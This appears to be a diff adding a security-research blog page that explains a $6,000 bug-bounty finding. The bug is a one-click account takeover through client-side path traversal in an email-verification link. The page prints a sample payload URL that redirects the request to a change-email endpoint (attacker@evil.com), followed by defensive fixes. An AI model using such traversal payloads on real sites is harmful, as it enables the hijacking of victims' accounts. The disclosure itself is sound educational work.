@@ -1,0 +1,264 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>$6,000 Bug Bounty: One-Click Account Takeover</title>
+    <meta name="description" content="A high-level, redacted writeup about abusing an email verification flow to bind an attacker email and seize an account.">
+    <link rel="stylesheet" href="../../style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/github-dark.min.css">
+</head>
+<body>
+    <div class="progress-bar" id="progressBar"></div>
+
+    <nav class="navbar">
+        <div class="nav-content">
+            <a href="../../" class="logo">Security Research</a>
+            <button class="theme-toggle" id="themeToggle" aria-label="Toggle theme">
+                <svg class="sun-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <circle cx="12" cy="12" r="5"></circle>
+                    <path d="M12 1v2M12 21v2M4.22 4.22l1.42 1.42M18.36 18.36l1.42 1.42M1 12h2M21 12h2M4.22 19.78l1.42-1.42M18.36 5.64l1.42-1.42"></path>
+                </svg>
+                <svg class="moon-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+                    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                </svg>
+            </button>
+        </div>
+    </nav>
+
+    <article class="article">
+        <header class="article-header">
+            <div class="article-meta">
+                <span class="tag critical">Critical Vulnerability</span>
+                <span class="tag">One-Click</span>
+                <span class="tag">Account Takeover</span>
+            </div>
+            <h1 class="article-title">$6,000 Bug Bounty: One-Click Account Takeover</h1>
+            <p class="article-subtitle">Abusing an email verification flow to bind an attacker email and seize any account.</p>
+            <div class="article-info">
+                <time datetime="2025">2025</time>
+                <span class="separator">|</span>
+                <span>10 min read</span>
+                <span class="separator">|</span>
+                <span>CVSS 9+</span>
+                <span class="separator">|</span>
+                <span class="bounty-badge">$6,000 Bounty</span>
+            </div>
+        </header>
+
+        <aside class="toc-container">
+            <div class="toc" id="toc">
+                <h3>Table of Contents</h3>
+                <nav id="tocNav"></nav>
+            </div>
+        </aside>
+
+        <div class="article-content">
+            <div class="callout callout-warning">
+                <strong>Responsible Disclosure:</strong> Technical identifiers, API paths, and the direct payload are intentionally redacted or generalized to avoid facilitating abuse. Use this for defense and education only.
+            </div>
+
+            <section id="discovery">
+                <h2>The Discovery</h2>
+                <p>I stumbled upon a vulnerability that scored a $6,000 bounty—a one-click account takeover that was as simple as it was dangerous.</p>
+                <p>By examining the platform's email verification flow, I found I could bind my email to any logged-in user's account. One click, and I owned their account—projects, environment variables, the works.</p>
+
+                <div class="callout callout-danger">
+                    <strong>Impact:</strong> Permanent account lockout of victims, access to sensitive data (projects, environment variables), and potential for malicious deployments.
+                </div>
+            </section>
+
+            <section id="how-it-worked">
+                <h2>How the Vulnerability Worked</h2>
+                <p>Users received a verification URL like:</p>
+                <pre><code class="language-plaintext">https://redacted.example/email-verification/#verify_token=&lt;codeId&gt;-&lt;secret&gt;</code></pre>
+
+                <p>Client-side code parsed the hash and split it into two parts:</p>
+                <pre><code class="language-javascript">// Pseudocode (sanitized)
+const parts = window.location.hash.replace("#verify_token=", "").split("-");
+const codeId = parts[0];
+const secret = parts[1];
+
+// codeId should map to backend verification...
+// but it wasn't validated strictly</code></pre>
+
+                <p>That <code>codeId</code> was then used to construct a request to the backend to verify the email.</p>
+
+                <div class="root-cause">
+                    <div class="cause-header">
+                        <span class="cause-num">!</span>
+                        <h4>The Bug</h4>
+                    </div>
+                    <p>The app implicitly trusted <code>codeId</code> and failed to constrain which endpoint it referenced. With insufficient validation, a crafted value could coerce the client into calling an unintended backend route.</p>
+                </div>
+            </section>
+
+            <section id="exploitation">
+                <h2>Abusing the Flow</h2>
+                <p>With insufficient validation, a crafted <code>codeId</code> could coerce the client into calling an unintended backend route—e.g., a change-email action—without CSRF protection or server-side checks linking the request to the verification flow.</p>
+
+                <p>Illustrative (changed) server path the client ended up hitting:</p>
+                <pre><code class="language-http">PUT /api/v1/change-email?email=attacker@redacted.tld
+Host: redacted.example
+Origin: https://redacted.example</code></pre>
+
+                <div class="callout callout-warning">
+                    <strong>Note:</strong> The exact route and parameters are changed for safety. Do not target real systems.
+                </div>
+
+                <h3>The Payload</h3>
+                <p>The exploit URL used Client-Side Path Traversal to escape the intended API route:</p>
+
+                <pre><code class="language-plaintext">https://target.example/email-verification/#verify_token=../../../api/v1/user/change-email?email=attacker@evil.com&dummy=-secret123</code></pre>
+
+                <p>When the client parsed this URL:</p>
+                <pre><code class="language-javascript">// Client code (vulnerable)
+const parts = hash.replace("#verify_token=", "").split("-");
+const codeId = parts[0];  // "../../../api/v1/user/change-email?email=attacker@evil.com&dummy="
+const secret = parts[1];  // "secret123"
+
+// This then constructs:
+fetch(`/api/v1/verification/${codeId}`, { method: 'POST', body: { secret } })
+// Which resolves to:
+// POST /api/v1/user/change-email?email=attacker@evil.com&dummy=</code></pre>
+
+                <p>The path traversal (<code>../../../</code>) escaped the <code>/api/v1/verification/</code> prefix and hit the <code>change-email</code> endpoint directly. Since the victim was already logged in, their session cookie authenticated the request.</p>
+
+                <div class="callout callout-danger">
+                    <strong>One click = Account takeover.</strong> The victim clicks the link, their email gets changed to the attacker's, and they're permanently locked out.
+                </div>
+            </section>
+
+            <section id="impact">
+                <h2>Impact</h2>
+                <p>This vulnerability allowed complete account takeover with a single click:</p>
+                <ul>
+                    <li><strong>Account Lockout:</strong> Permanent lockout of victim accounts</li>
+                    <li><strong>Data Access:</strong> Access to projects, environment variables, secrets</li>
+                    <li><strong>Supply Chain Risk:</strong> Potential for malicious deployments</li>
+                </ul>
+                <p><strong>Severity:</strong> Critical (CVSS 9+) | <strong>Bounty:</strong> $6,000</p>
+            </section>
+
+            <section id="defense">
+                <h2>Defensive Takeaways</h2>
+                <p>Never trust client-controlled routing or identifiers.</p>
+
+                <div class="fix-checklist">
+                    <h4>Quick Fix Checklist</h4>
+                    <div class="checklist-items">
+                        <div class="check-item">
+                            <span class="check-icon">&#10003;</span>
+                            <span>Bind verification codes to a single, server-known action</span>
+                        </div>
+                        <div class="check-item">
+                            <span class="check-icon">&#10003;</span>
+                            <span>Validate token structure and origin server-side</span>
+                        </div>
+                        <div class="check-item">
+                            <span class="check-icon">&#10003;</span>
+                            <span>Use short-lived, one-time tokens</span>
+                        </div>
+                        <div class="check-item">
+                            <span class="check-icon">&#10003;</span>
+                            <span>Enforce CSRF protection on state-changing routes</span>
+                        </div>
+                        <div class="check-item">
+                            <span class="check-icon">&#10003;</span>
+                            <span>Log and alert on odd verification flows</span>
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section id="root-causes">
+                <h2>Root Causes</h2>
+                <div class="root-causes">
+                    <div class="root-cause">
+                        <div class="cause-header">
+                            <span class="cause-num">1</span>
+                            <h4>Client-Side Trust</h4>
+                        </div>
+                        <div class="cause-code">
+                            <code>codeId from URL hash used to determine backend route</code>
+                        </div>
+                        <div class="cause-fix">
+                            <strong>Fix:</strong> Never let client-controlled values determine server actions
+                        </div>
+                    </div>
+                    <div class="root-cause">
+                        <div class="cause-header">
+                            <span class="cause-num">2</span>
+                            <h4>Missing CSRF Protection</h4>
+                        </div>
+                        <div class="cause-code">
+                            <code>PUT /api/v1/change-email had no CSRF validation</code>
+                        </div>
+                        <div class="cause-fix">
+                            <strong>Fix:</strong> Add CSRF tokens to all state-changing endpoints
+                        </div>
+                    </div>
+                    <div class="root-cause">
+                        <div class="cause-header">
+                            <span class="cause-num">3</span>
+                            <h4>Insufficient Token Binding</h4>
+                        </div>
+                        <div class="cause-code">
+                            <code>Verification token not bound to specific action type</code>
+                        </div>
+                        <div class="cause-fix">
+                            <strong>Fix:</strong> Tokens should specify and enforce their intended purpose
+                        </div>
+                    </div>
+                </div>
+            </section>
+
+            <section id="conclusion">
+                <h2>Conclusion</h2>
+                <p>Even "simple" oversights—like trusting client-side input—can have catastrophic consequences. This vulnerability showed how a single malformed URL could lead to complete account takeover.</p>
+
+                <blockquote class="key-takeaway">
+                    <strong>Never trust client-controlled routing. Validate everything server-side. Bind tokens to specific actions.</strong>
+                </blockquote>
+
+                <div class="vulnerability-summary">
+                    <div class="summary-item">
+                        <span class="summary-label">Vulnerability Type:</span>
+                        <span>Account Takeover via Email Verification Bypass</span>
+                    </div>
+                    <div class="summary-item">
+                        <span class="summary-label">Severity:</span>
+                        <span class="version vulnerable">Critical (CVSS 9+)</span>
+                    </div>
+                    <div class="summary-item">
+                        <span class="summary-label">Bounty:</span>
+                        <span class="version fixed">$6,000</span>
+                    </div>
+                </div>
+            </section>
+
+            <section id="ethics">
+                <h2>Disclosure & Ethics</h2>
+                <p>This post is for educational and defensive purposes. Do not test on systems without written permission. All identifiers, API paths, and payloads are altered or redacted.</p>
+
+                <div class="callout callout-success">
+                    <strong>Questions or feedback?</strong> Ping me on <a href="https://x.com/hamidonsolo" target="_blank" rel="noopener">X/Twitter @hamidonsolo</a>
+                </div>
+            </section>
+        </div>
+    </article>
+
+    <footer class="footer">
+        <p>Security Research Blog</p>
+    </footer>
+
+    <button class="back-to-top" id="backToTop" aria-label="Back to top">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+            <path d="M18 15l-6-6-6 6"></path>
+        </svg>
+    </button>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+    <script src="../../script.js"></script>
+</body>
+</html>
